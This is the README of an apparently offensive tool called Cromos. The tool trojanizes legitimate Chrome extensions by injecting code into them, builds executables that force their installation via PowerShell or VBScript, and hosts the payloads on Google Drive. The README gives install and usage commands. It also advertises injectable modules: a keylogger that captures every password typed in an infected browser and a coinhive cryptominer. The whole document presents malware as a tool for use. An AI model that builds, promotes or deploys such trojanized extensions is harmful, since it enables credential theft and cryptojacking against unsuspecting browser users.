# Cromos 

Chrome is a tool for downloading legitimate extensions of the Chrome Web Store and inject codes in the background of the application and more chrome create executable files to force installation via powershell or vbscript for example and also upload files to google drive for host the malicious files.

  - Download extension
  - Injections
  - Upload on google drive
  

  
  ### Demo
  This is a demonstration of the tool at work in this examples I'm downloading a famous Google extension called Alert Password on Google Chrome Web Store.
  
  ### Installation
  
```
$ cd /path/folder/
$ git clone https://github.com/fbctf/cromos
$ cd cromos && python setup.py
```
 ### Usage
 ```
 
Usage: python cromos.py --extension {id} --load {keylogger} --build {.bat}
  
 ```
 
### Modules
You can also inject some predefined modules in the background as keylogger, virtual currency.

Module | Description
--------|------------
modules/keylogger | This module captures all the passwords you type in an infected browser over https or not.
modules/currency | This module allows you to mine virtual coins using the coinhive API, you just need to have an account.
